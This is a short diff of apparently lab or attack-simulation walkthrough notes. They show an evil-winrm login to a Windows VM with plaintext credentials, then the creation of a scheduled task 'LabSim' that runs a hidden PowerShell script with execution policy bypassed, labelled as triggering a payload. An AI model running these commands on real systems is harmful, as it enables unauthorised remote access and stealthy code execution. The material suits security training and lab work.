@@ -7,7 +7,7 @@ Step 3: Connect to the Windows VM via WinRM
 evil-winrm -i 172.16.1.102 -u CEO -p 'CEOPass123!'
 
 Step 4: Create the Interactive Scheduled Task (still in winRM)
-schtasks /create /tn "LabSim" /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\CEO\Desktop\run_local.ps1" /sc once /st 00:00 /it /ru "champuser" /rp "Ch@mpl@1n!26" /f
+schtasks /create /tn "LabSim" /tr "cmd.exe /c start /b powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\CEO\Desktop\run_local.ps1" /sc once /st 00:00 /it /ru "CEO" /rp "CEOPass123!" /f
 
 Step 5: Trigger the Payload (still in WinRM)
 schtasks /run /tn "LabSim"
